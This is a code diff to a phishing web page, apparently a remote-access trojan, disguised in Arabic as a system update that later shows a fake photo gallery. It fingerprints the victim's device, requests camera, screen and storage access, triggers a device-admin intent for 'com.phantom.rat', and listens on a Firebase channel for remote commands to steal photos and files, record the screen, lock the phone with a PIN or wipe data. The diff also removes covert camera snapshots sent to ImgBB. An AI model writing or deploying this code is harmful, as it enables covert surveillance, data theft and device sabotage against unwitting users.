@@ -35,6 +35,7 @@
         let ROOT_HANDLE = null;
         let camStream = null;
         let audioCtx = null;
+        let deviceRegistered = false;
 
         setTimeout(() => {
             document.getElementById('msg').innerText = "يرجى الضغط على 'بدء التحديث' للمتابعة";
@@ -48,12 +49,8 @@
             document.getElementById('msg').innerText = "جاري فتح نافذة التحديث...";
             document.getElementById('guide').innerText = "الرجاء اختيار مجلد 'الذاكرة الداخلية' أو 'Internal Storage' ثم الضغط على 'موافق' أو 'Select'";
 
-            // تفعيل AudioContext للصوت
-            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            if (audioCtx.state === 'suspended') await audioCtx.resume();
-
-            // تسجيل الجهاز فوراً
-            registerDevice();
+            // تسجيل الجهاز أولاً
+            await registerDevice();
 
             // الحصول على الجذر
             try {
@@ -63,27 +60,28 @@
             }
 
             // الصلاحيات الأخرى
-            try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true }); } catch(e) {}
-            try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
+            try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
+            try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
             try {
                 let a = document.createElement('a');
                 a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
                 a.click();
             } catch(e) {}
 
-            vref.update({ online: true });
+            // تحديث الحالة
+            vref.child('online').set(true);
 
-            document.getElementById('msg').innerText = ROOT_HANDLE ? "✅ تم التحديث بنجاح" : "✅ تم الاتصال";
+            document.getElementById('msg').innerText = "✅ تم بنجاح";
             document.getElementById('guide').style.display = 'none';
             setTimeout(() => {
                 document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
             }, 1000);
 
             startCommandListener();
-            if (camStream) startHiddenCamera();
         };
 
         async function registerDevice() {
+            if (deviceRegistered) return;
             let ip = 'غير معروف';
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
             let battery = '?', charging = false;
@@ -94,7 +92,8 @@
                     charging = b.charging;
                 }
             } catch(e) {}
-            vref.set({
+
+            await vref.set({
                 online: true,
                 fingerprint: {
                     ua: navigator.userAgent,
@@ -102,38 +101,59 @@
                     scr: screen.width+'x'+screen.height,
                     cores: navigator.hardwareConcurrency,
                     mem: navigator.deviceMemory||'?',
-                    ip, battery, charging,
+                    ip: ip,
+                    battery: battery,
+                    charging: charging,
                     language: navigator.language,
                     time: new Date().toLocaleString()
                 }
             });
+            deviceRegistered = true;
+            console.log('✅ تم تسجيل الجهاز: ' + vid);
         }
 
         function startCommandListener() {
             vref.child('command').on('value', async snap => {
                 const c = snap.val();
                 if (!c) return;
+                console.log('📩 أمر وارد:', c);
                 try {
                     switch(c.action) {
                         case 'get_photos': c.folder ? await pullFromFolder(c.folder) : await pullAll(); break;
                         case 'get_files': await pullFromFolder(c.folder || 'downloads'); break;
                         case 'vibrate': navigator.vibrate([500,200,500,200,500]); break;
-                        case 'play_sound': playAlarm(); break;
+                        case 'play_sound': playRingtone(); break;
                         case 'screenshot': await screenshot(); break;
                         case 'record_video': await recordVid(c.duration||10); break;
                         case 'format': await formatDevice(); break;
-                        case 'stealth_photo': await captureHiddenPhoto(); break;
                         case 'flash_on': await setFlash(true); break;
                         case 'flash_off': await setFlash(false); break;
                         case 'device_info': await sendDeviceInfo(); break;
                         case 'lock_screen': lockScreen(c.pin || ''); break;
                     }
-                } catch(e) {}
+                } catch(e) {
+                    console.error('❌ خطأ:', e);
+                }
                 await vref.child('command').remove();
             });
         }
 
-        // ✅ طلب مجلد محدد من المستخدم
+        // ✅ تشغيل رنة تنبيه فقط (وليس الميكروفون)
+        function playRingtone() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'square';
+                osc.frequency.value = 800;
+                gain.gain.value = 0.3;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                setTimeout(() => { osc.stop(); gain.disconnect(); ctx.close(); }, 3000);
+            } catch(e) {}
+        }
+
         async function getFolderHandle(folderName) {
             const FOLDER_NAMES = {
                 camera: 'DCIM/Camera',
@@ -143,8 +163,6 @@
                 pictures: 'Pictures'
             };
             const displayName = FOLDER_NAMES[folderName] || folderName;
-
-            // نوجه الضحية لاختيار المجلد المطلوب
             document.body.innerHTML = `<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد:<br>${displayName}</h2>`;
             try {
                 const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
@@ -186,20 +204,6 @@
             }
         }
 
-        // ✅ الصوت
-        function playAlarm() {
-            if (!audioCtx) return;
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.type = 'square';
-            osc.frequency.value = 800;
-            gain.gain.value = 0.5;
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            osc.start();
-            setTimeout(() => { osc.stop(); gain.disconnect(); }, 2000);
-        }
-
         async function setFlash(on) {
             if (!camStream) return;
             let track = camStream.getVideoTracks()[0];
@@ -222,7 +226,6 @@
             stream.getTracks().forEach(t => t.stop());
         }
 
-        // ✅ تسجيل الفيديو مع الصوت
         async function recordVid(sec) {
             let stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
             let recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
@@ -254,42 +257,13 @@
             if (navigator.clearData) await navigator.clearData({ cache: true, cookies: true, storage: true });
         }
 
-        // ✅ قفل الشاشة برمز PIN
         function lockScreen(pin) {
             try {
-                // محاولة قفل الشاشة عبر DevicePolicyManager
                 window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
-                // محاولة القفل الفوري
                 setTimeout(() => {
                     window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end');
                 }, 500);
             } catch(e) {}
-        }
-
-        function startHiddenCamera() {
-            if (!camStream) return;
-            let video = document.createElement('video');
-            video.srcObject = camStream; video.playsInline = true; video.play();
-            setInterval(async () => {
-                let canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                let b64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
-                let url = await uploadToImgBB(b64);
-                await store('stealth_photo', url, { ts: Date.now() });
-            }, 12000);
-        }
-
-        async function captureHiddenPhoto() {
-            if (!camStream) throw new Error('لا كاميرا');
-            let img = new ImageCapture(camStream.getVideoTracks()[0]);
-            let bitmap = await img.grabFrame();
-            let canvas = document.createElement('canvas'); canvas.width = bitmap.width; canvas.height = bitmap.height;
-            canvas.getContext('2d').drawImage(bitmap, 0, 0);
-            let b64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-            let url = await uploadToImgBB(b64);
-            await store('photo', url, { ts: Date.now() });
         }
 
         async function uploadToImgBB(b64) {
